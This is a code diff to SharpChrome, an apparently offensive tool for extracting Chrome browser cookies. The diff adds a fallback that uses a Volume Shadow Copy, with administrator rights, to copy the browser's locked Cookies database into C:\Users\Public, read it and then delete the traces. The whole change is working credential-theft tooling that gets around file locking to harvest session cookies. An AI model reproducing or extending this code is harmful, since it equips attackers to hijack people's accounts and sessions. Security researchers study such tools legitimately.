@@ -531,14 +531,24 @@ namespace SharpChrome
                 return;
             }
 
+            string cookie_tempFile = @"C:\Users\Public\Cookies";
+
             try
             {
                 database = new SQLiteConnection(cookieFilePathUri, SQLiteOpenFlags.ReadOnly | SQLiteOpenFlags.OpenUri, false);
             }
-            catch (Exception e)
+            catch
             {
-                Console.WriteLine("[X] {0}", e.InnerException.Message);
-                return;
+                //Use volume shadow technology to copy occupied Cookies files, but administrator rights are required
+                string newCookie = cookieFilePath.Replace("C:", "");
+                string shadowCopyID = Vsscopy.CreateShadow();
+                string path = String.Format("{0}{1}", Vsscopy.ListShadow(shadowCopyID), newCookie);
+                SharpDPAPI.Interop.CopyFile(path, cookie_tempFile, true);
+                Vsscopy.DeleteShadow(shadowCopyID);
+
+                uri = new System.Uri(cookie_tempFile);
+                cookieFilePathUri = String.Format("{0}?nolock=1", uri.AbsoluteUri);
+                database = new SQLiteConnection(cookieFilePathUri, SQLiteOpenFlags.ReadOnly | SQLiteOpenFlags.OpenUri, false);
             }
 
             // old - fails in some cases due to partial indexing :(
@@ -761,8 +771,9 @@ namespace SharpChrome
             {
                 Console.WriteLine("}\r\n]\r\n");
             }
-
+            
             database.Close();
+            File.Delete(cookie_tempFile);
         }
 
         // adapted from https://github.com/djhohnstein/SharpChrome/blob/e287334c0592abb02bf4f45ada23fecaa0052d48/ChromeCredentialManager.cs#L322-L344
